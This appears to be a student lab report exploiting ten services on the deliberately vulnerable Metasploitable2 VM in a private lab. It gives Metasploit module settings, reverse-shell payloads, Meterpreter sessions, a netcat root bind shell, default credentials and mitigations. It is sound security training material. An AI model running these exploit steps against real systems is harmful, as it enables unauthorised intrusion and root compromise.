# Metasploitable2 Exploitation Report

**Name:** Eugene Antwi Boasiako
**Index Number:** 7352623
**Date:** September 20, 2026
**Target IP:** 192.168.1.3
**Attacker OS / Tools:** Kali Linux, Metasploit Framework, Nmap, Netcat

---

## Reconnaissance Summary

Initial host enumeration was conducted using a comprehensive TCP port and service detection scan:
`nmap -p- -sV -sC 192.168.1.3`

The scan identified a broad attack surface with multiple vulnerable, legacy, and misconfigured services running:
- **FTP (Port 21):** vsftpd 2.3.4 (known vulnerable backdoor) alongside anonymous access.
- **SSH (Port 22) & Telnet (Port 23):** Remote administrative management services.
- **HTTP / Web (Ports 80, 8180):** Apache httpd and Apache Tomcat/Coyote JSP engine with default administrative manager portals.
- **RPC / NFS (Ports 111, 2049):** Network File System with wildcard root export configuration.
- **SMB (Ports 139, 445):** Samba 3.X service containing unauthenticated command execution flaws.
- **distccd (Port 3632):** Distributed compiler daemon accepting unauthenticated compilation tasks.
- **PostgreSQL (Port 5432):** Database service accessible with standard default credentials.
- **VNC (Port 5900):** Virtual Network Computing service configured with a weak password.
- **IRC (Port 6667):** Unreal3.2.8.1 IRC daemon containing an embedded backdoor.
- **Ingreslock (Port 1524):** Open root-level bind shell.

---

## Exploit 1: NFS Unrestricted Share

- **Service / Port:** NFS / 2049
- **Vulnerability:** Misconfigured NFS export — root filesystem (`/`) shared with no host restriction
- **Tool Used:** `showmount` and `mount` (native NFS client tools)
- **Why This Tool:** No exploit module is needed for a misconfiguration like this — the export itself grants access. Native OS tools are the correct choice because they interact with NFS exactly as a legitimate client would; using Metasploit here would add nothing.
- **Steps:**
  1. `showmount -e 192.168.1.3` → returned `Export list for 192.168.1.3: / *`, confirming the root filesystem is exported to any host (`*`).
  2. `sudo mkdir -p /mnt/nfs`
  3. `sudo mount -t nfs 192.168.1.3:/ /mnt/nfs`
  4. `ls -la /mnt/nfs` → full root directory listing returned (`bin`, `boot`, `etc`, `home`, `lib`, `root`, `var`, etc. — effectively the entire target filesystem).
  5. `sudo umount /mnt/nfs` (cleanup)
- **Evidence:** `evidence/exploit1.jpg`
- **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Actions on Objectives
  - Reconnaissance: `showmount -e` enumerated the export list and revealed the wildcard (`*`) share before any access was attempted.
  - Delivery: The `mount` command is what actually delivers the request that establishes access to the share.
  - Actions on Objectives: Listing (`ls -la`) and having read/write access to the full remote filesystem.
- **Outcome / Impact:** Full read/write access to the target's root filesystem from an unauthenticated remote host — no credentials or payload required.

---

## Exploit 2: VNC Weak Password

- **Service / Port:** VNC / 5900
- **Vulnerability:** Weak/default authentication password
- **Tool Used:** `auxiliary/scanner/vnc/vnc_login` (Metasploit) + `vncviewer`
- **Why This Tool:** The Metasploit scanner module automates credential testing against the VNC RFB protocol far faster than manual connection attempts, and hands off a confirmed working password directly for use with a viewer.
- **Steps:**
  1. `search vnc_login` to locate `auxiliary/scanner/vnc/vnc_login`.
  2. `use auxiliary/scanner/vnc/vnc_login`
  3. `set RHOSTS 192.168.1.3`
  4. `run` → `192.168.1.3:5900 - Login Successful: :password` (password found: `password`)
  5. `vncviewer 192.168.1.3` → first connection attempt returned "Authentication failure" (password entered incorrectly/mistyped).
  6. `vncviewer 192.168.1.3` → second attempt succeeded: "Authentication successful", desktop identified as `root's X desktop (metasploitable:0)`.
- **Evidence:** `evidence/exploit2.jpg`
- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Actions on Objectives
  - Reconnaissance/Weaponization: Selecting and configuring the login-scanner module against the target.
  - Delivery: Sending the authentication attempts to the VNC service.
  - Exploitation: Successful authentication with the weak password.
  - Actions on Objectives: Full interactive graphical desktop access, including a root terminal visible inside the session.
- **Outcome / Impact:** Interactive graphical (GUI) access to the target as root.

---

## Exploit 3: Tomcat Manager Default Login

- **Service / Port:** Apache Tomcat / 8180
- **Vulnerability:** Default credentials on the Tomcat Manager application (`tomcat:tomcat`)
- **Tool Used:** `exploit/multi/http/tomcat_mgr_upload`
- **Why This Tool:** This module automates the entire WAR-upload attack chain — authenticating to the manager interface, packaging a payload as a deployable WAR, and triggering it via Tomcat's own deploy mechanism — rather than performing each HTTP request by hand.
- **Steps:**
  1. `search tomcat_mgr_upload`
  2. `use exploit/multi/http/tomcat_mgr_upload`
  3. `set RHOSTS 192.168.1.3`
  4. `set RPORT 8180`
  5. `set HttpUsername tomcat`
  6. `set HttpPassword tomcat`
  7. `set LHOST 192.168.1.4`
  8. `run` → retrieved session ID/CSRF token, uploaded and deployed `Wdjo0p1007i0gVlg...`, executed it, then undeployed it automatically.
- **Evidence:** `evidence/exploit3.jpg`
- **Cyber Kill Chain Stage(s):** Delivery, Exploitation (attempted — not confirmed)
  - Delivery: The WAR payload was successfully uploaded and deployed to the manager app.
  - Exploitation: The deployed WAR was executed by Tomcat.
- **Outcome / Impact — ⚠️ Not fully confirmed.** The console output explicitly reads `"Exploit completed, but no session was created."` The default-credential authentication and WAR deployment both worked, but no reverse shell/session was caught in this run.

---

## Exploit 4: PostgreSQL Payload Execution

- **Service / Port:** PostgreSQL / 5432
- **Vulnerability:** Default credentials (`postgres:postgres`)
- **Tool Used:** `exploit/linux/postgres/postgres_payload`
- **Why This Tool:** This module logs in with the known default credentials and uses PostgreSQL's ability to load a compiled shared object (`.so`) as a user-defined function — turning an authenticated DB session into arbitrary OS command execution.
- **Steps:**
  1. `search postgres_payload`
  2. `use exploit/linux/postgres/postgres_payload`
  3. `set RHOSTS 192.168.1.3`
  4. `set USERNAME postgres`
  5. `set PASSWORD postgres`
  6. `set LHOST 192.168.1.4`
  7. `run` → connected to PostgreSQL 8.3.1 on i486-pc-linux-gnu, uploaded `/tmp/WHQIYLPK.so`, sent the Meterpreter stage, and opened **Meterpreter session 4**.
  8. `getuid` → `Server username: postgres`
  9. `sysinfo` → Computer: `metasploitable.localdomain`, OS: Ubuntu 8.04 (Linux 2.6.24-16-server), Architecture: i686, Meterpreter: x86/linux.
- **Evidence:** `evidence/exploit4.jpg`
- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives
  - Delivery: The shared object was uploaded to `/tmp`.
  - Exploitation/Installation: Loading the `.so` executed code and established the foothold.
  - C2: The Meterpreter session itself is the command-and-control channel.
  - Actions on Objectives: `getuid` and `sysinfo` enumeration of the compromised host.
- **Outcome / Impact:** Confirmed remote code execution and an active Meterpreter session as the `postgres` user.

---

## Exploit 5: DistCC Command Execution

- **Service / Port:** distccd / 3632
- **Vulnerability:** CVE-2004-2687 — distccd accepts and executes compilation jobs from any client with no authentication
- **Tool Used:** `exploit/unix/misc/distcc_exec`
- **Why This Tool:** distccd is designed to execute whatever compiler command it's handed, with no authentication — this module simply sends a crafted command instead of a real build job, which is exactly the daemon's intended behavior turned against it.
- **Steps:**
  1. `search distcc`
  2. `use exploit/unix/misc/distcc_exec`
  3. `set RHOSTS 192.168.1.3`
  4. `set LHOST 192.168.1.4`
  5. `run` with the default payload (`cmd/unix/reverse_bash`) — failed: `stderr: bash: 49: Bad file descriptor` / `/dev/tcp/192.168.1.4/4444: No such file or directory`. The target's shell lacks `/dev/tcp` support for a bash-based reverse shell.
  6. `set PAYLOAD cmd/unix/reverse_perl` — switched payloads since the target's `bash` build doesn't support the needed redirection.
  7. `run` again → **Command shell session 5 opened**.
  8. `whoami` → `daemon`
  9. `id` → `uid=1(daemon) gid=1(daemon) groups=1(daemon)`
- **Evidence:** `evidence/exploit5.jpg`
- **Cyber Kill Chain Stage(s):** Weaponization, Delivery, Exploitation, C2
  - Weaponization: Initial payload choice failed; re-weaponizing with a Perl-based reverse shell was required for the target's environment.
  - Delivery/Exploitation: Sending the crafted "compile" command that the daemon executed.
  - C2: The resulting shell session.
- **Outcome / Impact:** Remote command execution as the `daemon` user. Notably required payload troubleshooting — the default bash reverse shell doesn't work against this target, Perl does.

---

## Exploit 6: UnrealIRCd Backdoor

- **Service / Port:** IRC / 6667
- **Vulnerability:** Intentionally backdoored source code in this UnrealIRCd 3.2.8.1 build — any line containing a specific trigger string is executed as a shell command
- **Tool Used:** `exploit/unix/irc/unreal_ircd_3281_backdoor`
- **Why This Tool:** The backdoor only triggers on a specific crafted string sent over the IRC protocol; the module handles registering a fake IRC user and sending that exact trigger, which would be tedious and error-prone to replicate by hand with raw netcat.
- **Steps:**
  1. `use exploit/unix/irc/unreal_ircd_3281_backdoor`
  2. `set RHOSTS 192.168.1.3`
  3. `set LHOST 192.168.1.4`
  4. `run` → connected to port 6667, registered IRC user, target confirmed vulnerable via IRC commands, backdoor command sent — `"Exploit completed, but no session was created."`
  5. `set PAYLOAD cmd/unix/reverse`
  6. `run` again → connected with a new IRC user, same vulnerability confirmation and backdoor trigger sent — again `"Exploit completed, but no session was created."`
- **Evidence:** `evidence/exploit6.jpg`
- **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery (attempted — not confirmed)
  - Reconnaissance: Confirmed the target is vulnerable via the IRC-based detection check, on both attempts.
  - Delivery: The backdoor trigger string was sent to the service twice.
- **Outcome / Impact — ⚠️ Not confirmed.** Both runs detected the vulnerability but neither produced a session.

---

## Exploit 7: vsftpd 2.3.4 Backdoor

- **Service / Port:** FTP / 21
- **Vulnerability:** CVE-2011-2523 — a malicious backdoor inserted into the vsftpd 2.3.4 source, triggered by a `:)` smiley-face sequence in the username
- **Tool Used:** `exploit/unix/ftp/vsftpd_234_backdoor`
- **Why This Tool:** The trigger condition is a specific malformed username string followed by catching a listener the backdoor opens on port 6200 — the module automates sending the trigger and connecting to the resulting listener in one step.
- **Steps:**
  1. `use exploit/unix/ftp/vsftpd_234_backdoor`
  2. `set RHOSTS 192.168.1.3`
  3. `set LHOST 192.168.1.4`
  4. `run` → started reverse TCP handler, ran the automatic vulnerability check, FTP banner confirmed vsFTPd 2.3.4, backdoor detected, **Meterpreter session 1 opened**.
- **Evidence:** `evidence/exploit7.jpg`
- **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Exploitation, Installation, C2
  - Reconnaissance: Automatic FTP banner check confirming the vulnerable version.
  - Delivery: Sending the malformed username containing the trigger.
  - Exploitation/Installation: The backdoor listener spawned and was caught.
  - C2: The resulting Meterpreter session.
- **Outcome / Impact:** Full root-level Meterpreter session — the most complete compromise among all 10 exploits.

---

## Exploit 8: Anonymous FTP

- **Service / Port:** FTP / 21
- **Vulnerability:** Anonymous login permitted with no restrictions
- **Tool Used:** Standard `ftp` client
- **Why This Tool:** No exploit module is needed — this is a direct configuration weakness. A plain FTP client is the correct tool because it demonstrates the issue exactly as a casual/unauthenticated user would encounter it.
- **Steps:**
  1. `ftp 192.168.1.3`
  2. Username: `anonymous` → prompted for password
  3. Password: (blank) → `230 Login successful.`
  4. `ls` → directory listing returned.
- **Evidence:** `evidence/exploit8.jpg`
- **Cyber Kill Chain Stage(s):** Reconnaissance, Exploitation, Actions on Objectives
  - Reconnaissance: Confirming the FTP banner and that anonymous login is accepted.
  - Exploitation: Logging in without valid credentials.
  - Actions on Objectives: Enumerating the remote directory structure.
- **Outcome / Impact:** Unauthenticated read access to the FTP root directory.

---

## Exploit 9: Samba usermap_script

- **Service / Port:** SMB / 139
- **Vulnerability:** CVE-2007-2447 — the Samba `usermap script` configuration option passes the username field to a shell without sanitization
- **Tool Used:** `exploit/multi/samba/usermap_script`
- **Why This Tool:** The vulnerability is in how Samba handles a specific config option, so exploitation means injecting shell metacharacters into the username field during authentication — the module builds and sends that crafted authentication request directly.
- **Steps:**
  1. `use exploit/multi/samba/usermap_script`
  2. `set RHOSTS 192.168.1.3`
  3. `set PAYLOAD cmd/unix/reverse_netcat`
  4. `run` → started reverse TCP handler, **Command shell session 3 opened**.
  5. `whoami` → `root`
  6. `id` → `uid=0(root) gid=0(root)`
- **Evidence:** `evidence/exploit9.jpg`
- **Cyber Kill Chain Stage(s):** Delivery, Exploitation, C2
  - Delivery: The crafted SMB authentication request containing the shell metacharacters.
  - Exploitation: The injected command executed as root.
  - C2: The resulting command shell session.
- **Outcome / Impact:** Direct root shell with no credentials required at all.

---

## Exploit 10: Ingreslock Bind Shell

- **Service / Port:** Ingreslock / 1524
- **Vulnerability:** Pre-existing open root bind shell left listening on this port (a known artifact of a prior compromise baked into the Metasploitable2 image)
- **Tool Used:** `nc` (Netcat)
- **Why This Tool:** No exploitation is actually required — the port already has a root shell bound and listening with no authentication. Netcat is the right tool because it does nothing but open a raw TCP connection, which is all that's needed to pick up the shell.
- **Steps:**
  1. `nc 192.168.1.3 1524`
  2. `whoami` → `root`
  3. `id` → `uid=0(root) gid=0(root)`
  4. `exit` to close the connection.
- **Evidence:** `evidence/exploit10.jpg`
- **Cyber Kill Chain Stage(s):** Delivery, Exploitation, C2
  - Delivery: The raw TCP connection to the open port.
  - Exploitation: Arguably none needed — the misconfiguration itself is the "exploit".
  - C2: Direct interactive access to the pre-existing root shell.
- **Outcome / Impact:** Instant, unauthenticated root shell — the simplest and fastest compromise of all 10.

---

## Kill Chain Coverage Summary

| Exploit | Recon | Weaponization | Delivery | Exploitation | Installation | C2 | Actions on Objectives |
|---|---|---|---|---|---|---|---|
| 1. NFS Unrestricted Share | ✔ | | ✔ | | | | ✔ |
| 2. VNC Weak Password | ✔ | ✔ | ✔ | ✔ | | | ✔ |
| 3. Tomcat Manager Default Login ⚠️ | | | ✔ | (attempted) | | | |
| 4. PostgreSQL Payload Execution | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ |
| 5. DistCC Command Execution | | ✔ | ✔ | ✔ | | ✔ | |
| 6. UnrealIRCd Backdoor ⚠️ | ✔ | | ✔ | (attempted) | | | |
| 7. vsftpd 2.3.4 Backdoor | ✔ | | ✔ | ✔ | ✔ | ✔ | |
| 8. Anonymous FTP | ✔ | | | ✔ | | | ✔ |
| 9. Samba usermap_script | | | ✔ | ✔ | | ✔ | |
| 10. Ingreslock Bind Shell | | | ✔ | ✔ | | ✔ | |

⚠️ = exploit attempted but no session confirmed in the evidence captured — see notes above.

---

## Lessons Learned / Mitigations

- **NFS Unrestricted Share:** Restrict `/etc/exports` to specific trusted host IPs/subnets, never export `/` or sensitive paths, and enable `root_squash` to prevent remote root mapping.
- **VNC Weak Password:** Set a strong, unique VNC password (or disable password auth entirely in favor of SSH tunneling), and don't expose VNC directly to any untrusted network.
- **vsftpd 2.3.4 Backdoor:** Never deploy a version known to be backdoored — verify package checksums/signatures, keep FTP daemons patched, and monitor for unexpected listeners (e.g. port 6200).
- **Samba usermap_script:** Upgrade past the vulnerable Samba version (CVE-2007-2447) and remove the `usermap script` option from `smb.conf` entirely if not strictly required.
- **Ingreslock Bind Shell:** Audit for and remove any unused/legacy services; a root shell bound with no authentication should never exist, let alone ship by default.
